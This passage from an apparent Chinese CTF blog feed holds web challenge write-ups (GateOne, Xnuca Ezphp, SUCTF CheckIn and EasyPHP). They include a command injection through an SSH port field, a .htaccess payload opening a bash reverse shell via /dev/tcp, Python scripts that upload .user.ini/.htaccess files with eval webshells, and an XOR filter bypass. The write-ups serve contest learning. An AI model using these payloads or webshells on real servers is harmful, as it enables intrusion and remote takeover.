'host'."</span>)</span><br><span class="line">        message = &#123;<span class="string">'terminal:sshjs_display_fingerprint'</span>: out_dict&#125;</span><br><span class="line">        self.write_message(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = settings[<span class="string">'host'</span>]</span><br><span class="line">    self.ssh_log.<span class="builtin-name">debug</span>(</span><br><span class="line">        <span class="string">"get_host_fingerprint(%s:%s)"</span> % (host, port),</span><br><span class="line">        metadata=&#123;<span class="string">'host'</span>: host, <span class="string">'port'</span>: port&#125;)</span><br><span class="line">    out_dict.update(&#123;</span><br><span class="line">        <span class="string">'result'</span>: <span class="string">'Success'</span>,</span><br><span class="line">        <span class="string">'host'</span>: host,</span><br><span class="line">        <span class="string">'fingerprint'</span>: None</span><br><span class="line">    &#125;)</span><br><span class="line">    ssh = which(<span class="string">'ssh'</span>)</span><br><span class="line">    command = <span class="string">"%s -p %s -oUserKnownHostsFile=none -F. %s"</span> % (ssh, port, host)</span><br><span class="line">    m = self.new_multiplex(</span><br><span class="line">        command,</span><br><span class="line">        <span class="string">'get_host_key'</span>,</span><br><span class="line">        <span class="attribute">logging</span>=<span class="literal">False</span>) #<span class="built_in"> Logging </span>is <span class="literal">false</span> so we don<span class="string">'t make tons of silly logs</span></span><br></pre></td></tr></table></figure>
<p>其中port没有经过任何安全检测或过滤就直接拼接到了command上，用于终端执行ssh连接命令，而get_host_fingerprint函数是在WebSocket中触发执行</p>
<figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">#ssh.py</span><br><span class="line">hooks = &#123;</span><br><span class="line">    #<span class="symbol">'Web'</span>: [(r<span class="string">"/ssh"</span>, <span class="type">KnownHostsHandler</span>)],</span><br><span class="line">    <span class="symbol">'WebSocket'</span>: &#123;</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_known_hosts': get_known_hosts,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_save_known_hosts': save_known_hosts,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_connect_string': get_connect_string,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_execute_command': ws_exec_command,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_identities': get_identities,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_public_key': get_public_key,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_private_key': get_private_key,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_host_fingerprint': get_host_fingerprint,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_gen_new_keypair': generate_new_keypair,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_store_id_file': store_id_file,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_delete_identity': delete_identity,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_set_default_identities': set_default_identities,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="symbol">'Escape'</span>: opt_esc_handler,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#ssh.js</span><br><span class="line">.....</span><br><span class="line">var document = window.document, <span class="comment">// Have to do this because we're sandboxed</span></span><br><span class="line">    go = GateOne,</span><br><span class="line">    prefix = go.prefs.prefix,</span><br><span class="line">    u = go.Utils,</span><br><span class="line">    v = go.Visual,</span><br><span class="line">    E = go.Events,</span><br><span class="line">    t = go.Terminal,</span><br><span class="line">    gettext = go.i18n.gettext,</span><br><span class="line">    urlObj = (window.URL<span class="operator"> || </span>window.webkitURL),</span><br><span class="line">    logFatal = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logFatal,</span><br><span class="line">    logError = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logError,</span><br><span class="line">    logWarning = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logWarning,</span><br><span class="line">    logInfo = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logInfo,</span><br><span class="line">    logDebug = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logDebug;</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">    handleConnect: <span class="keyword">function</span>(connectString) &#123;</span><br><span class="line">        <span class="comment">/**:GateOne.SSH.handleConnect(connectString)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Handles the `terminal:sshjs_connect` WebSocket action which should provide an SSH *connectString* in the form of 'user@host:port'.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The *connectString* will be stored in `GateOne.Terminal.terminals[term]['sshConnectString']` which is meant to be used in duplicating terminals (because you can't rely on the title).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Also requests the host's public SSH key so it can be displayed to the user.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        log<span class="constructor">Debug('<span class="params">sshjs_connect</span>: ' + <span class="params">connectString</span>)</span>;</span><br><span class="line">        var host = connectString.split(<span class="character">'@'</span>)<span class="literal">[<span class="number">1</span>]</span>.split(<span class="character">':'</span>)<span class="literal">[<span class="number">0</span>]</span>,</span><br><span class="line">            port = connectString.split(<span class="character">'@'</span>)<span class="literal">[<span class="number">1</span>]</span>.split(<span class="character">':'</span>)<span class="literal">[<span class="number">1</span>]</span>,</span><br><span class="line">            message = &#123;'host': host, 'port': port&#125;,</span><br><span class="line">            term = localStorage<span class="literal">[<span class="identifier">prefix</span>+'<span class="identifier">selectedTerminal</span>']</span>;</span><br><span class="line">        t.terminals<span class="literal">[<span class="identifier">term</span>]</span><span class="literal">['<span class="identifier">sshConnectString</span>']</span> = connectString;</span><br><span class="line">        go.ws.send(<span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>stringify(&#123;'terminal:ssh_get_host_fingerprint': message&#125;));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>所以可以知道是通过GateOne来发送WebSocket，从而触发执行。所以我们可以自己构造 go.ws.send(JSON.stringify({‘terminal:ssh_get_host_fingerprint’: message}));语句，通过port来进行命令拼接，从而实现在终端上执行任意命令。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span></span>ws.send('&#123;<span class="string">"terminal:ssh_get_host_fingerprint"</span>:&#123;<span class="string">"host"</span>:<span class="string">"[ip]"</span>,<span class="string">"port"</span>:<span class="string">"22;ls;"</span>&#125;&#125;')</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-6876a862944ce0a9.png" alt></p>
<p>列出了网站的根目录</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">bin   dev  gateone  lib    media  opt                <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">boot</span> <span class="title"> etc</span> <span class="title"> home</span> <span class="title">    lib64</span> <span class="title"> mnt</span> <span class="title">   ppppp_f_l_4_g_mmm</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span> <span class="title"> usr</span></span><br></pre></td></tr></table></figure>
<p>所以拼接一下cat /ppppp_f_l_4_g_mmm文件的命令就可以拿到flag了</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span></span>ws.send('&#123;<span class="string">"terminal:ssh_get_host_fingerprint"</span>:&#123;<span class="string">"host"</span>:<span class="string">"[ip]"</span>,<span class="string">"port"</span>:<span class="string">"22;cat /ppppp_f_l_4_g_mmm;"</span>&#125;&#125;')</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-83b114f6f3a64a5d.png" alt></p>
<h3 id="0x05-render"><a href="#0x05-render" class="headerlink" title="0x05 render"></a>0x05 render</h3><p>Thymeleaf Spring EL SSTI  后面补上</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>XXE</tag>
        <tag>RCE</tag>
        <tag>telnet</tag>
        <tag>.user.ini</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Xnuca_Ezphp WP</title>
    <url>/2019/08/25/2019-Xnuca-Ezphp-WP/</url>
    <content><![CDATA[<p><strong>这次不是滑水，是被难住了，时间都花在了Ezphp上，简单纪录一下</strong></p>
<p>首先贴一下题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目的逻辑很简单，访问的时候清除该目录下除了index.php文件以外的所有文件，主要就是两个正则，而且只有一次写的机会，因为想要第二次写的话，就会把第一次写的东西给清了</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) <span class="params">||</span> stristr($content,<span class="string">'html'</span>) <span class="params">||</span> stristr($content,<span class="string">'type'</span>) <span class="params">||</span> stristr($content,<span class="string">'flag'</span>) <span class="params">||</span> stristr($content,<span class="string">'upload'</span>) <span class="params">||</span> stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">    echo <span class="string">"Hacker"</span>;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">    echo <span class="string">"Hacker"</span>;</span><br><span class="line">    die();</span><br></pre></td></tr></table></figure>

<p>文件名限制了只能是[a-z]和‘.’，而且题目环境设置了只有index.php文件解析，其他php文件不解析，本来想着绕过这个正则建立一个fl3g.php，用条件竞争来文件包含，奈何文件名的正则绕不过去，那就只能考虑绕content的正则了，只要关键字不被匹配到就能过，所以思路就是把关键字拆开，而且新建的php文件都不解析，所以首先想到的就是写一个.htaccess文件。<br>写.Htaccess文件的困难主要在于过滤了file,on,type之类的，而且文件后追加了\nJust one chance，没有办法注释的话，htaccess文件会出错，所以所有的功夫都用在绕过这两个点上。</p>
<p>参考：<a href="https://blog.csdn.net/cool_flag/article/details/78980097" target="_blank" rel="noopener">https://blog.csdn.net/cool_flag/article/details/78980097</a></p>
<p>利用添加 \ 的方法来换行书写，利用这种方法来处理过滤的关键字，输出的代码恰好会有不可见字符，正则匹配的时候是分开的，而逻辑上又是一行拼接在一起的一个完整的关键字，所以可以绕过过滤，例如file可以通过如下方式绕过</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">Fi\</span><br><span class="line"><span class="keyword">Le</span></span><br></pre></td></tr></table></figure>
<p>这样就可以绕过content的内容限制，而对于\nJust one chance也是利用同样的绕过方法，在内容末尾加上#\来注释后面的内容。只有一次写的机会自然不能用AddType application/x-httpd-php .xxx的方式，这样需要再写一个文件进去。<br>参考文章：<a href="https://bbs.pediy.com/thread-222907.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222907.htm</a>，将代码写在htaccess文件里，利用php_value auto_prepend_file .htaccess让php文件包含htaccess文件，htaccess里的代码会执行，所以直接用反弹shell的方式简单粗暴一些，可以以利用404、403等页面来触发。</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = 'http://<span class="number">02</span>cdf<span class="number">9</span>ef<span class="number">40</span>d<span class="number">440</span>d<span class="number">1</span>bd<span class="number">0</span>ba<span class="number">727</span>da<span class="number">4</span>b<span class="number">348</span><span class="keyword">c</span><span class="number">21</span>ce<span class="number">0e526</span>eea<span class="number">4</span>fad.changame.ichunqiu.com/'</span><br><span class="line">payload = '?filename=.htaccess&amp;content=php_value<span class="symbol">%20</span>auto_prepend_fi\\<span class="symbol">%0</span>Ale<span class="symbol">%20</span><span class="string">".htaccess"</span>\n<span class="symbol">%23</span>&lt;?php system(\'bash -<span class="keyword">c</span> <span class="string">"/bin/bash -i &gt;%26 /dev/tcp/ip/port 0&lt;%261"</span>\')<span class="comment">;?&gt;\\'</span></span><br><span class="line"><span class="comment">url2 = url + payload</span></span><br><span class="line"><span class="comment">r = requests.get(url2)</span></span><br><span class="line"><span class="comment">req = request.get(url)</span></span><br></pre></td></tr></table></figure>
<p>vpss上监听一个端口，跑下脚本就可以收到反弹回来的shell，接下来找flag就好了，没想到的是竟然放在/root/下……</p>
<p><img src="/2019/08/25/2019-Xnuca-Ezphp-WP/8418106-1ccd692d906d1332.png" alt></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 SUCTF Web writeup</title>
    <url>/2019/08/19/2019-SUCTF-Web-writeup/</url>
    <content><![CDATA[<p><strong>这次比赛滑水了，只有中午和晚上有时间看题，都是大佬们带着飞的，记录下部分Web的解题思路</strong></p>
<h3 id="0x01-CheckIn"><a href="#0x01-CheckIn" class="headerlink" title="0x01 CheckIn"></a>0x01 CheckIn</h3><p>这题在国赛的华东北区半决赛出现过，当时的服务器环境是apache + php，所以解法是上传.htaccess和里面用base64协议来解析上传的马。</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">#.htacess</span><br><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>     #用来绕过文件头检测</span><br><span class="line">AddType application/<span class="keyword">x</span>-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/uploads/[md5(ip)]/shell.jpg"</span></span><br></pre></td></tr></table></figure>
<p>绕过文件头检测还可以用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">#shell.jpg</span><br><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span></span><br><span class="line">简单的一句话木马base<span class="number">64</span>编码就好了</span><br></pre></td></tr></table></figure>
<p>不过这里是nginx环境，.htaccess就用不上了，所以就是要找一个nginx中类似于.htaccess的配置文件来设置解析，刚好nginx上有一个.user.ini文件，参考：<a href="http://www.mumaasp.com/222.html" target="_blank" rel="noopener">http://www.mumaasp.com/222.html</a><br>.user.ini</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span></span><br><span class="line">auto_prepend_file = <span class="keyword">cc</span>.jpg</span><br></pre></td></tr></table></figure>
<p>cc.jpg绕过&lt;?的过滤</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span>\<span class="keyword">x</span><span class="number">8</span>a\<span class="keyword">x</span><span class="number">39</span></span><br><span class="line">&lt;script language='php'&gt;eval($_REQUEST[<span class="keyword">c</span>])<span class="comment">;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">#php5环境下可用</span></span><br></pre></td></tr></table></figure>
<p>上传后index.php会默认包含了一句话木马，所以直接执行命令就好了</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-51f84b72837ec29d.png" alt></p>
<p>贴一下上传的脚本</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9021/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">userini = b<span class="string">""</span><span class="string">"\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">auto_prepend_file = cc.jpg</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"&lt;?php eval($_GET['c']);?&gt;")</span></span><br><span class="line">shell =  b<span class="string">"\x00\x00\x8a\x39\x8a\x39"</span>+b<span class="string">"00"</span> + <span class="string">"&lt;script language='php'&gt;eval(<span class="variable">$_REQUEST</span>[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'.user.ini'</span>,userini,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"upload .user.ini"</span>)</span><br><span class="line">r = requests.post(<span class="attribute">url</span>=url, <span class="attribute">data</span>=data, <span class="attribute">files</span>=files)#proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(r.text) </span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"upload cc.jpg"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'cc.jpg'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(<span class="attribute">url</span>=url, <span class="attribute">data</span>=data, <span class="attribute">files</span>=files)</span><br><span class="line"><span class="builtin-name">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h3 id="0x02-EasyPHP"><a href="#0x02-EasyPHP" class="headerlink" title="0x02 EasyPHP"></a>0x02 EasyPHP</h3><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这题由两部分组成，第一部分为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br></pre></td></tr></table></figure>
<p>第二部分就是get_the_flag函数，所以也就分成两部分出来解题，既然题目直接给了eval，还各种限制，那么想要突破限制直接getshell估计不可行，所以思路就是突破限制调用get_the_flag函数，绕后通过第二部分来getshell。<br>第一部分参考：<a href="https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU%20CTF%202019%20Quals/web/easyphp.md" target="_blank" rel="noopener">https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU%20CTF%202019%20Quals/web/easyphp.md</a><br>显然现在的正则严格了特别多，而且还做了字符长度的限制，不过利用方式应该是一样的，就是通过异或的方法来构造出我们需要的php代码，因为字符长度的限制，所以我们可以构造出一个$_GET[x]出来，绕后利用php语法解析${$_GET[x]}，通过参数x来触发get_the_flag函数。<br>首先fuzz出我们当前可见的字符有</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"># ; ! $ % ( ) * + - / : <span class="tag">&lt; &gt;</span> ? @ \ ] ^ </span><span class="template-variable">&#123; &#125;</span></span><br></pre></td></tr></table></figure>
<p>fuzz脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">		<span class="keyword">echo</span> bin2hex(chr($ascii));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以就是用这些字符来异或，异或出$_GET即可,这里就不贴FUZZ异或的脚本了</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%fe%fe%fe%fe^%a1%b9%bb%aa   -&gt; $_GET</span><br></pre></td></tr></table></figure>
<p>接下来就是拼接参数什么的,同时要考虑过</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure>
<p>所以最后拼接出来的就是</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe^<span class="meta">%</span>a<span class="number">1</span><span class="meta">%</span>b<span class="number">9</span><span class="meta">%</span>bb<span class="meta">%</span>aa&#125;&#123;<span class="meta">%</span>fe&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>fe=get_the_flag</span><br></pre></td></tr></table></figure>
<p>接下来要做的就是第二部分了，第二部分在XMAN的个人赛中出现过，其实也和第一题是一样的，只是这次刚好就是apache+php环境了，所以直接用第一题中提到的脚本打个shell就好了，贴个脚本</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9001/?_=<span class="subst">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;</span>&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = b<span class="string">""</span><span class="string">"\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file "</span>php:<span class="regexp">//filter</span><span class="regexp">/convert.base64-decode/resource</span>=<span class="regexp">/var/www</span><span class="regexp">/html/upload</span><span class="regexp">/tmp_95edeac63aff85469e0ebd216f87ce5a/shell</span>.cc<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line">shell = b<span class="string">"\x00\x00\x8a\x39\x8a\x39"</span>+b<span class="string">"00"</span>+ base64.b64encode(b<span class="string">"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span 